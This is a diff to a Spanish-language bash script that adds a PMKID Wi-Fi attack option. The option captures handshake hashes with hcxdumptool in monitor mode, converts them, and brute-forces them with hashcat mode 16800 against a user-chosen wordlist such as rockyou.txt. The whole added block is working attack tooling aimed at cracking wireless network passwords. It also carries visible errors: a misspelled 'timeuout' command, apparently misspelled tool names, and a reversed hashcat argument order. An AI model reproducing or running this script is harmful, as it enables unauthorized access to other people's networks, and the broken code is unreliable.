@@ -118,7 +118,23 @@ if [ $airtest -eq 0 ] && [ $xtermtest -eq 0 ] && [ $macctest -eq 0 ]; then
 								fi
 								;;
 								2)
-								echo "Prueba"
+								echo -e "\n${greenColour}[*] Iniciando ataque PKMID..\n"
+								sleep 1 
+								timeuout 60 bash -c "hcxdumptool -i ${tar}mon --enable_status=1 -o Hash" &
+								echo -e "\n${redColour} [%] Capturando Hashes\n"
+								sleep 2
+								hcxcaptool -z Hashes Hash; rm Hash 2>/dev/null
+								test -f  Hashes
+								if [ "$(echo $?)" == "0" ]; then
+									echo -e "\n${yellowColour}[*] Inicianndo ataque de fuerza bruta"
+									sleep 1
+									echo -e "\n${blueColour}[*] Ruta de rockyou.txt: /usr/share/wordlists/rockyou.txt${endColour}"
+									read -p "[?] Ruta del Diccionario al usar: " dicc1
+									hashcat -m 16800 $dicc1 Hashes -d 1 --force 
+								else 
+									echo -e "\n${redColour}[!] No se pudo capturar el paquete necesario"
+									exit
+								fi
 								;;
 								3)
 								echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
